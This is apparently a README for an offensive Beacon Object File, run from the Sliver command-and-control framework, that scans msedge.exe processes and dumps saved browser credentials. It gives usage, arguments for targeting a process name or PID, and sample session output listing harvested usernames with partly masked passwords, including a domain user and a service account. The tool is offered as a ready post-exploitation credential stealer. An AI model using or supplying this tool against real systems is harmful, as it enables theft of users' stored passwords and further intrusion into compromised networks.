A BOF (tested with Sliver, if that matters) based on [EdgeSavedPasswordsDumper](https://github.com/L1v1ng0ffTh3L4N/EdgeSavedPasswordsDumper).

## Usage
Just run it. By default it scans all processes named "msedge.exe" and dumps creds.

Arguments:
- `-process` - process name to search for (defaults to "msedge.exe")
- `-pid` - pid to scan

## Example
```
[127.0.0.1] sliver (MOTIONLESS_RANGE) > edgecreds

  -process:<empty> (default)
  -pid:0 (default)
[*] Successfully executed edgecreds (coff-loader)
[*] Got output:
[*] Searching for 'msedge.exe'
[+] Process opened: 2404
[+] Process owner: VANTARAOPS\jmorris
[+] Username: jmorris
    Password: J[**]3 

[+] Username: jmorris
    Password: 1[**]@ 

[+] Username: jmorris
    Password: 1[**]@ 

[+] Username: sburns
    Password: 8[**]4 

[+] Username: svc_vdi
    Password: V[**]1 

[+] Username: jmorris
    Password: F[**]5
```

Search for something other than msedge (but why?)
```
[127.0.0.1] sliver (MOTIONLESS_RANGE) > edgecreds -- -process=notedge.exe
```

Dump specific pid
```
[127.0.0.1] sliver (MOTIONLESS_RANGE) > edgecreds -- -pid=1337
```
